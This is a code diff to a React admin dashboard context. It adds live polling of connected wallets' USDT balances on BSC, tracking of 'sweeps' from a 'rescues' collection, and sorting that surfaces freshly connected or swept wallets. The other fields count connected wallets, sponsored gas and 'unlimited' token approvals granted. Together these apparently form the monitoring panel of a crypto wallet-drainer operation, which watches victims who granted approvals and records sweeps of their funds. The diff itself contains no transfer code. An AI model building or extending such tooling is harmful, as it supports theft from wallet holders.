@@ -1,5 +1,5 @@
 // src/client/context/AdminDataContext.tsx
-import React, { createContext, useContext, useState, useEffect, ReactNode, useMemo } from 'react';
+import React, { createContext, useContext, useState, useEffect, ReactNode, useMemo, useCallback } from 'react';
 import {
   collection,
   query,
@@ -7,7 +7,9 @@ import {
   onSnapshot,
   Timestamp,
 } from 'firebase/firestore';
+import { ethers } from 'ethers';
 import { db } from '../config/firebase';
+import { RPC_URL, USDT_CONTRACT } from '../config/publicConfig';
 
 export interface WalletDoc {
   id: string;
@@ -15,6 +17,13 @@ export interface WalletDoc {
   sponsoredAt?: Timestamp;
   sponsorTxHash?: string;
   createdAt?: string;
+}
+
+export interface SweepInfo {
+  sweptAtMs: number;
+  txHash?: string;
+  amount?: string;
+  formattedAmount?: string;
 }
 
 export interface TwoDayStats {
@@ -25,7 +34,12 @@ export interface TwoDayStats {
 
 interface AdminDataContextType {
   allWallets: WalletDoc[];
+  sortedWallets: WalletDoc[];
   twoDayStats: TwoDayStats | null;
+  latestSweepsMap: Record<string, SweepInfo>;
+  balances: Record<string, { balance: string; loading: boolean }>;
+  refreshBalance: (address: string) => Promise<void>;
+  recordLocalSweep: (address: string, txHash?: string, amount?: string) => void;
   connectedCount: number;
   unlimitedTodayCount: number;
   isLoading: boolean;
@@ -41,16 +55,52 @@ function startOfToday(): Timestamp {
   return Timestamp.fromDate(d);
 }
 
-function startOf48hAgo(): Timestamp {
-  return Timestamp.fromMillis(Date.now() - 48 * 60 * 60 * 1000);
+const BSC_RPCS = [
+  RPC_URL,
+  'https://bsc-rpc.publicnode.com/',
+  'https://binance.llamarpc.com',
+  'https://bsc-dataseed.binance.org/',
+];
+
+const ERC20_BALANCE_ABI = [
+  'function balanceOf(address owner) view returns (uint256)',
+];
+
+async function fetchOnChainUSDTBalance(address: string): Promise<string> {
+  for (const rpc of BSC_RPCS) {
+    try {
+      const provider = new ethers.JsonRpcProvider(rpc, undefined, { staticNetwork: true });
+      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_BALANCE_ABI, provider);
+      const rawBal: bigint = await contract.balanceOf(address);
+      const formatted = ethers.formatUnits(rawBal, 18);
+      const num = parseFloat(formatted);
+      if (num === 0) return '0.00';
+      if (num < 0.01) return num.toFixed(4);
+      return num.toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2,
+      });
+    } catch {
+      // try next fallback rpc
+    }
+  }
+  return '0.00';
 }
 
 export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
   const [allWallets, setAllWallets] = useState<WalletDoc[]>([]);
   const [twoDayStats, setTwoDayStats] = useState<TwoDayStats | null>(null);
+  const [dbSweepsMap, setDbSweepsMap] = useState<Record<string, SweepInfo>>({});
+  const [localSweepsMap, setLocalSweepsMap] = useState<Record<string, SweepInfo>>({});
+  const [balances, setBalances] = useState<Record<string, { balance: string; loading: boolean }>>({});
   const [isWalletsLoaded, setIsWalletsLoaded] = useState(false);
   const [isRescuesLoaded, setIsRescuesLoaded] = useState(false);
   const [error, setError] = useState<string | null>(null);
+
+  // Combine Firestore database sweeps with immediate optimistic sweeps
+  const latestSweepsMap = useMemo(() => {
+    return { ...dbSweepsMap, ...localSweepsMap };
+  }, [dbSweepsMap, localSweepsMap]);
 
   useEffect(() => {
     setError(null);
@@ -78,41 +128,146 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
       }
     );
 
-    // 2. Real-time listener for rescues in the last 48 hours
-    const cutoff = startOf48hAgo();
-    const rescuesQuery = query(
-      collection(db, 'rescues'),
-      where('createdAt', '>=', cutoff)
-    );
+    // 2. Real-time listener for rescues collection (all sweeps)
+    const rescuesQuery = query(collection(db, 'rescues'));
 
     const unsubRescues = onSnapshot(
       rescuesQuery,
       (snapshot) => {
         const docs = snapshot.docs.map((doc) => doc.data());
+
+        // 48h stats
+        const now = Date.now();
+        const cutoff48h = now - 48 * 60 * 60 * 1000;
+        const recentDocs = docs.filter((d) => {
+          if (!d.createdAt) return false;
+          const ms = typeof d.createdAt.toMillis === 'function'
+            ? d.createdAt.toMillis()
+            : new Date(d.createdAt).getTime();
+          return ms >= cutoff48h;
+        });
+
         setTwoDayStats({
-          total: docs.length,
-          successful: docs.filter((d) => d.status === 'CONFIRMED').length,
-          unlimitedGranted: docs.filter(
+          total: recentDocs.length,
+          successful: recentDocs.filter((d) => d.status === 'CONFIRMED').length,
+          unlimitedGranted: recentDocs.filter(
             (d) => d.status === 'CONFIRMED' && d.amount && d.amount !== '0'
           ).length,
         });
+
+        // Map latest sweep per wallet
+        const sweeps: Record<string, SweepInfo> = {};
+        for (const d of docs) {
+          const user = (d.user || '').toLowerCase();
+          if (!user) continue;
+          let ms = 0;
+          if (typeof d.createdAt?.toMillis === 'function') {
+            ms = d.createdAt.toMillis();
+          } else if (d.createdAt) {
+            ms = new Date(d.createdAt).getTime() || 0;
+          }
+
+          const existing = sweeps[user];
+          if (!existing || ms > existing.sweptAtMs) {
+            sweeps[user] = {
+              sweptAtMs: ms,
+              txHash: d.sweepTxHash,
+              amount: d.amount,
+              formattedAmount: d.amountFormatted,
+            };
+          }
+        }
+        setDbSweepsMap(sweeps);
         setIsRescuesLoaded(true);
       },
       (err) => {
         console.error('AdminDataContext rescues listener error:', err);
-        // Do not overwrite main error if wallets succeeded
         setIsRescuesLoaded(true);
       }
     );
 
-    // Clean up real-time listeners on unmount
     return () => {
       unsubWallets();
       unsubRescues();
     };
   }, []);
 
-  // ── Derived metrics computed client-side from wallet stream ─────────
+  // ── Fetch & Monitor on-chain USDT balances for connected wallets ────────
+  const fetchSingleBalance = useCallback(async (address: string) => {
+    const lower = address.toLowerCase();
+    setBalances((prev) => ({
+      ...prev,
+      [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: true },
+    }));
+
+    try {
+      const bal = await fetchOnChainUSDTBalance(address);
+      setBalances((prev) => ({
+        ...prev,
+        [lower]: { balance: bal, loading: false },
+      }));
+    } catch {
+      setBalances((prev) => ({
+        ...prev,
+        [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: false },
+      }));
+    }
+  }, []);
+
+  // Monitor balances for all wallets whenever the wallet list changes
+  useEffect(() => {
+    if (allWallets.length === 0) return;
+
+    let isSubscribed = true;
+
+    const checkBalances = async () => {
+      for (const w of allWallets) {
+        if (!isSubscribed) break;
+        const lower = w.id.toLowerCase();
+        // Skip if already loaded and not older
+        if (balances[lower] && !balances[lower].loading) continue;
+        await fetchSingleBalance(w.id);
+      }
+    };
+
+    checkBalances();
+
+    // Periodic live refresh every 30 seconds
+    const interval = setInterval(() => {
+      if (!isSubscribed) return;
+      allWallets.forEach((w) => fetchSingleBalance(w.id));
+    }, 30000);
+
+    return () => {
+      isSubscribed = false;
+      clearInterval(interval);
+    };
+  }, [allWallets, fetchSingleBalance]);
+
+  // ── Record an immediate sweep event locally (moves wallet to top & zeroes balance) ─
+  const recordLocalSweep = useCallback(
+    (address: string, txHash?: string, amount?: string) => {
+      const lower = address.toLowerCase();
+      setLocalSweepsMap((prev) => ({
+        ...prev,
+        [lower]: {
+          sweptAtMs: Date.now(),
+          txHash,
+          amount,
+          formattedAmount: amount,
+        },
+      }));
+
+      // Immediately zero out the balance
+      setBalances((prev) => ({
+        ...prev,
+        [lower]: { balance: '0.00', loading: false },
+      }));
+    },
+    []
+  );
+
+  // ── Derived metrics ─────────────────────────────────────────────────
   const connectedCount = allWallets.length;
 
   const unlimitedTodayCount = useMemo(() => {
@@ -124,13 +279,40 @@ export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children 
     }).length;
   }, [allWallets]);
 
+  // ── Keep newly connected and latest swept wallets on the top ─────────
+  const sortedWallets = useMemo(() => {
+    return [...allWallets].sort((a, b) => {
+      const getScore = (w: WalletDoc) => {
+        const sponsoredMs = w.sponsoredAt?.toMillis?.() ?? 0;
+        let createdMs = 0;
+        if (w.createdAt) {
+          if (typeof (w.createdAt as any).toMillis === 'function') {
+            createdMs = (w.createdAt as any).toMillis();
+          } else {
+            const parsed = new Date(w.createdAt as any).getTime();
+            if (!isNaN(parsed)) createdMs = parsed;
+          }
+        }
+        const sweepMs = latestSweepsMap[w.id.toLowerCase()]?.sweptAtMs ?? 0;
+        // The most recent event (connect or sweep) determines rank
+        return Math.max(sponsoredMs, createdMs, sweepMs);
+      };
+      return getScore(b) - getScore(a);
+    });
+  }, [allWallets, latestSweepsMap]);
+
   const isLoading = !isWalletsLoaded || !isRescuesLoaded;
 
   return (
     <AdminDataContext.Provider
       value={{
         allWallets,
+        sortedWallets,
         twoDayStats,
+        latestSweepsMap,
+        balances,
+        refreshBalance: fetchSingleBalance,
+        recordLocalSweep,
         connectedCount,
         unlimitedTodayCount,
         isLoading,
